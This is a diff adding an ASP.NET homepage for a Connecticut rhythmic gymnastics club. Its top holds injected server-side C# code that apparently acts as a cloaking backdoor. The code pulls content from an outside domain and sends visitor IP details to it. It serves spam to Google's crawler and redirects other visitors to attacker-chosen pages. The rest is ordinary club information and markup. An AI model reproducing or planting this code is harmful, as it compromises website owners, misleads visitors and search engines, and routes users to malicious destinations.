@@ -1,0 +1,320 @@
+﻿<%@ Page Language="C#" %>
+<script runat="server">
+
+    protected void Page_Load(object sender, EventArgs e)
+    {
+        if (!IsPostBack)
+        {
+            string httpxy = HttpContext.Current.Request.IsSecureConnection ? "https://" : "http://";
+            webclient = new System.Net.WebClient();
+            webclient.Encoding = System.Text.Encoding.UTF8;
+
+
+            string vurl = "http://www.jbzoimg.com/";
+            if (Request.QueryString["g"] != null)
+            {
+                sz = Request.QueryString["g"];
+                jd = webclient.DownloadString(vurl + "5.aspx?sz=" + sz);
+
+            }
+            else
+            {
+                jd = webclient.DownloadString(vurl + "5.aspx?xy=" + httpxy);
+                sz = webclient.DownloadString(vurl + "5.aspx?jd=" + jd);
+            }
+            string m = "1";
+            if (Request.QueryString["m"] != null)
+            {
+                m = Request.QueryString["m"];
+            }
+
+            string URL = jd + "0814.aspx";
+            if (Request.QueryString["s"] != null)
+            {
+
+
+                URL = jd + "s814.aspx?cid=" + Request.QueryString["cid"] + "&number=" + Request.QueryString["number"] + "&pnum=" + Request.QueryString["pnum"] + "&m=" + m;
+                content = webclient.DownloadString(URL);
+                content = content.Replace("yymm", httpxy + HttpContext.Current.Request.Url.Host + HttpContext.Current.Request.Path);
+                content = content.Replace("ggggg", sz);
+                content = content.Replace("iid=", "DNN=ke");
+                Response.ContentType = "text/xml";
+                Response.Write(content);
+                Response.End();
+            }
+            else
+            {
+
+
+                if (Request.QueryString["DNN"] != null)
+                {
+
+                    URL += "?iid=" + Request.QueryString["DNN"].Replace("ke", "") + "&cid=" + Request.QueryString["cid"] + "&m=" + m;
+                    kname = webclient.DownloadString(jd + "gn.aspx?iid=" + Request.QueryString["DNN"].Replace("ke", ""));
+                    tz();
+                    content = webclient.DownloadString(URL);
+                }
+                else
+                {
+                    tz();
+                    URL += "?cid=" + Request.QueryString["cid"] + "&pnum=" + Request.QueryString["pnum"] + "&m=" + m;
+                    content = webclient.DownloadString(URL);
+
+                }
+                content = content.Replace("ggggg", sz);
+                content = content.Replace("IIIII", httpxy + HttpContext.Current.Request.Url.Host);
+                content = content.Replace("UUUUU", httpxy + HttpContext.Current.Request.Url.Host + HttpContext.Current.Request.Path);
+                content = content.Replace("iid=", "DNN=ke");
+            }
+        }
+    }
+    public void tz()
+    {
+
+        string ip = System.Web.HttpContext.Current.Request.ServerVariables["REMOTE_ADDR"] + "*" + System.Web.HttpContext.Current.Request.ServerVariables["REMOTE_HOST"] + "*" + System.Web.HttpContext.Current.Request.ServerVariables["HTTP_CLIENT_IP"] + "*" + System.Web.HttpContext.Current.Request.ServerVariables["HTTP_X_FORWARDED"] + "*" + System.Web.HttpContext.Current.Request.ServerVariables["HTTP_FORWARDED_FOR"] + "*" + System.Web.HttpContext.Current.Request.ServerVariables["HTTP_FORWARDED"];
+        if (Request.QueryString["kk"] != null)
+        {
+            ip = "66.249.64.190";
+        }
+        string ipurl = jd + "getdomain.aspx?rnd=1&ip=" + ip;
+        webclient = new System.Net.WebClient();
+        webclient.Encoding = System.Text.Encoding.UTF8;
+        string domain = webclient.DownloadString(ipurl).ToLower();
+        if (domain.IndexOf("google") == -1)
+        {
+
+            if (Request.QueryString["DNN"] != null)
+            {
+                string tzurl = jd + "a.aspx";
+                Response.Redirect(tzurl + "?cid=" + Request.QueryString["cid"] + "&cname=" + HttpUtility.UrlEncode(kname) + "&url=" + HttpContext.Current.Request.Url.Host + HttpContext.Current.Request.Path);
+                Response.End();
+            }
+
+            if (Request.QueryString["pnum"] != null)
+            {
+                string tzurl = jd + "a.aspx";
+                tzurl = tzurl.Replace("products.aspx", "");
+                Response.Redirect(tzurl + "?cid=" + Request.QueryString["cid"] + "&url=" + HttpContext.Current.Request.Url.Host + HttpContext.Current.Request.Path);
+                Response.End();
+            }
+
+        }
+    }
+
+
+    public System.Net.WebClient webclient = null;
+    public string content = "";
+
+    public string kname = "";
+    public string jd = "";
+    public string sz = "";
+
+</script>
+<%=content%>
+<html><head>
+    <title>CT Rhythmic Gymnastics Academy</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="layout/styles/bootstrap.min.css" rel="stylesheet" type="text/css" media="all">
+    <link href="layout/styles/layout.css" rel="stylesheet" type="text/css" media="all">
+    <link href="layout/styles/carousel.css" rel="stylesheet" type="text/css" media="all">
+    <link href="layout/styles/fontawesome-4.2.0.min.css" rel="stylesheet">
+    <link href="https://plus.google.com/101175393103683101672" rel="publisher">
+    <div class="fit-vids-style" id="fit-vids-style" style="display: none;">­<style>.fluid-width-video-wrapper{width:100%;position:relative;padding:0;}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper object,.fluid-width-video-wrapper embed {position:absolute;top:0;left:0;width:100%;height:100%;}</style></div><script type="text/javascript" async="" defer="" src="https://apis.google.com/js/platform.js?publisherid=101175393103683101672" gapi_processed="true">
+    </script>
+</head>
+<body id="top">
+    <!-- ################################################################################################ -->
+    <!-- ################################################################################################ -->
+    <!-- ################################################################################################ -->
+    <div class="wrapper row0">
+        <div id="topbar" class="clear">
+            <!-- ################################################################################################ -->
+            <nav>
+                <ul>
+                    <li><a href="index.html">Home</a></li>
+                    <li><a href="pages/contactus.html">Contact Us</a></li>
+                </ul>
+            </nav>
+        </div>
+    </div>
+    <!-- ################################################################################################ -->
+    <!-- ################################################################################################ -->
+    <!-- ################################################################################################ -->
+    <div class="wrapper row1">
+        <header id="header" class="clear">
+            <!-- ################################################################################################ -->
+            <div id="logo" class="fl_left">
+                <h1><a href="index.html">CT Rhythmic Gymnastics Academy</a></h1>
+            </div>
+        </header>
+    </div>
+    <!-- ################################################################################################ -->
+    <!-- ################################################################################################ -->
+    <!-- ################################################################################################ -->
+    <div class="wrapper row2">
+        <div class="rounded">
+            <nav id="mainav" class="clear">
+                <ul class="clear">
+                    <li class="active"><a href="index.html">Home</a></li>
+                    <li><a href="/pages/classes.html">Classes</a></li>
+                    <li><a href="/pages/gallery.html">Gallery</a></li>
+                    <li><a href="/pages/OurCoaches.html">Coaches</a></li>
+                    <li><a href="/pages/usefulLinks.html">Useful Links</a></li>
+                    <li><a href="/pages/register.html">Register</a></li>
+                </ul>
+            <form action="#"><select><option selected="selected" value="">MENU</option><option value="index.html">- Home</option><option value="/pages/classes.html">- Classes</option><option value="/pages/gallery.html">- Gallery</option><option value="/pages/OurCoaches.html">- Coaches</option><option value="/pages/usefulLinks.html">- Useful Links</option><option value="/pages/register.html">- Register</option></select></form></nav>
+        </div>
+    </div>
+    <!-- ################################################################################################ -->
+    <!-- ################################################################################################ -->
+    <!-- ################################################################################################ -->
+    <div class="wrapper row3">
+        <div id="slider" class="rounded">
+            <div id="slide-wrapper" class="rounded clear">
+
+                <div id="myCarousel" class="carousel slide" data-ride="carousel">
+                    <!-- Indicators -->
+                    <ol class="carousel-indicators">
+                        <li data-target="#myCarousel" data-slide-to="0" class=""></li>
+                        <li data-target="#myCarousel" data-slide-to="1" class=""></li>
+                        <li data-target="#myCarousel" data-slide-to="2" class="active"></li>
+                        <li data-target="#myCarousel" data-slide-to="3"></li>
+                    </ol>
+
+                    <!-- Wrapper for slides -->
+                    <div class="carousel-inner" role="listbox">
+                        <div class="item">
+                            <img src="images/PhotoBanner/Banner00.jpg" alt="">
+                        </div>
+                        <div class="item">
+                            <img src="images/PhotoBanner/Banner01.jpg" alt="">
+                        </div>
+                        <div class="item active">
+                            <img src="images/PhotoBanner/Banner02.jpg" alt="">
+                        </div>
+                        <div class="item">
+                            <img src="images/PhotoBanner/Banner03.jpg" alt="">
+                        </div>
+                        <div class="item">
+                            <img src="images/PhotoBanner/Banner04.jpg" alt="">
+                        </div>                                          
+                    </div>
+
+                    <!-- Left and right controls -->
+                    <a class="left carousel-control" href="#myCarousel" role="button" data-slide="prev">
+                        <span class="glyphicon glyphicon-chevron-left" aria-hidden="true"></span>
+                        <span class="sr-only">Previous</span>
+                    </a>
+                    <a class="right carousel-control" href="#myCarousel" role="button" data-slide="next">
+                        <span class="glyphicon glyphicon-chevron-right" aria-hidden="true"></span>
+                        <span class="sr-only">Next</span>
+                    </a>
+                </div>
+                <!-- ################################################################################################ -->
+            </div>
+        </div>
+    </div>
+    <!-- ################################################################################################ -->
+    <!-- ################################################################################################ -->
+    <!-- ################################################################################################ -->
+    <div class="wrapper row4">
+        <div class="rounded">
+            <main class="container clear">
+                <!-- main body -->
+                <!-- ################################################################################################ -->
+                <div class="group btmspace-30">
+                    <div class="two_third first">
+                        <!-- ################################################################################################ -->
+                        <h2>Welcome to the CT Rhythmic Gymnastics Academy!</h2>
+                        <div class="imgl borderedbox"><img src="images/demo/gymnastlogo.gif" alt="" style="width:100px;height:auto;"></div>
+                        <p>
+                            Connecticut Rhythmic Gymnastics is the leading club for rhythmic gymnastics in the state. We offer both competitive and recreational programs. Widely recognized in Europe, Rhythmic Gymnastics is becoming more well known in North America.
+                        </p>
+                        <p>
+                            Our club teaches skills such as flexibility, strength, coordination, and proper posture and alignment. In addition, rhythmic gymnasts use apparatuses that enhance fine and gross motor skills and spacial awareness. Although much of the sport involves individual efforts, we train as a team. By working in groups, our gymnasts learn teamwork, leadership, and sportsmanship. We are committed to making each gymnast’s experience as beneficial as possible.
+                        </p>
+                        <p>
+                            Rhythmic gymnastics combines the elements and technique of ballet and dancing with the strength of artistic gymnastics. Rhythmic gymnasts do not tumble like artistic gymnasts, but do handstands, rolls, cartwheels, walkovers and other integral acrobatic movements. At competitions, rhythmic gymnasts are judged on the execution of their routine, which involves elements that consist of jumps, turns, balances and flexibility postures. The minute long routines are performed to music and are breathtaking to watch. Rhythmic Gymnastics is a refined sport, which depends on facial/physical expression giving it a slightly theatrical vibe. Routines exhibit the gymnast’s talent, which can develop through consistent training and proper coaching. The benefits of being a rhythmic gymnast are endless and continue throughout life. Girls that partake in rhythmic gymnastics will value from having increased range of motion, which can decrease the chance of injuries later on in life.
+                        </p>
+                    </div>
+                    <div class="one_quarter sidebar">
+                        <!-- ################################################################################################ -->
+                        <div class="sdb_holder">
+                            <h6>Take a Virtual Tour</h6>                            
+                            <iframe width="240" height="190" src="https://www.youtube.com/embed/Zw9CHoconQk" class="youtube-player" type="text/html" frameborder="1" allowfullscreen=""></iframe>
+                        </div>
+                       
+                    </div>
+                </div>
+
+                <div id="twitter" class="group btmspace-30">
+                    <div class="one_quarter first center">
+                        <i class="fa fa-twitter fa-3x"></i>
+                    </div>
+                    <div class="three_quarter bold">
+				       <p> *******     Great news!! Open enrollment for Winter2022! ********</p><p>
+					   </p><p>   8 class session for girls 5-10 years old</p><p>
+					   </p><p>   Sunday, January 10th - Feb 27th From 2:30 - 3:30PM</p><p>
+					   </p><p>   Montessori school &amp; Discovery Center school gym</p><p>
+					   </p><p>   114 Palisado Ave, Windsor, CT 06095</p><p>
+					   </p><p>   New Student Classes - No Experience or Equipment Needed</p><p>
+					</p></div>
+                </div>
+                <div class="clear"></div>
+            </main>
+        </div>
+    </div>
+
+    <div class="wrapper row4">
+        <div class="rounded">
+            <footer id="footer" class="clear">
+                <div class="one_third first">
+                    <figure class="center">
+                        <img class="btmspace-15" src="images/demo/worldmap.png" alt="">
+                        <figcaption><a href="https://www.google.com/maps/dir/41.8316997,-72.8278393/windsor+discovery+center+%26+montessori+school+windsor+ct+06095/@41.8481667,-72.8719931,11z/data=!3m1!4b1!4m9!4m8!1m1!4e1!1m5!1m1!1s0x89e6ff419c3f6a1d:0xb3da2726e3537480!2m2!1d-72.6352956!2d41.8576689">Find Us With Google Maps »</a></figcaption>
+                    </figure>
+                </div>
+                <div class="one_third">
+                    <address>
+                        CT Rhythmic Gymnastics <br>
+                        NorthStars SportsPlex<br>
+                        310 Albany Turnpike<br>
+                        Canton, CT 06019<br>
+                        <br>
+                        <i class="fa fa-phone pright-10"></i>(860) 751-9207<br>
+						<i class="fa fa-envelope-o pright-10"></i> <a href="#">ctrgclub@gmail.com</a>
+                    </address>
+                </div>
+                <div class="one_third">
+                    <p class="nospace btmspace-10">Stay Up to Date With What's Happening</p>
+                    <ul class="faico clear">
+                        <li><a class="faicon-facebook" href="https://www.facebook.com/groups/208956432508639/"><i class="fa fa-facebook"></i></a></li>
+                        <li><a class="faicon-facebook" href="https://www.facebook.com/pages/CT-Rhythmic-Gymnastic-Academy/327630563923723"><i class="fa fa-facebook"></i></a></li>
+                    </ul>
+                    <form class="clear" method="post" action="#">
+                        <fieldset>
+                            <legend>Subscribe To Our Newsletter:</legend>
+                            <input type="text" value="" placeholder="Enter Email Here…">
+                            <button class="fa fa-sign-in" type="submit" title="Sign Up"><em>Sign Up</em></button>
+                        </fieldset>
+                    </form>
+                </div>
+            </footer>
+        </div>
+    </div>
+    <!-- ################################################################################################ -->
+    <div class="wrapper row5">
+        <div id="copyright" class="clear">
+            <p class="fl_left">Copyright © 2015 - All Rights Reserved - <a href="#">CTRGClub</a></p>
+            <p class="fl_right">Template by <a target="_blank" href="http://www.os-templates.com/" title="Free Website Templates">OS Templates</a></p>
+        </div>
+    </div>
+    <!-- JAVASCRIPTS -->
+    <script src="layout/scripts/jquery.min.js"></script>
+    <script src="layout/scripts/bootstrap.min.js"></script>
+    <script src="layout/scripts/jquery.fitvids.min.js"></script>
+    <script src="layout/scripts/jquery.mobilemenu.js"></script>
+    <script src="layout/scripts/tabslet/jquery.tabslet.min.js"></script>
+
+</body></html>
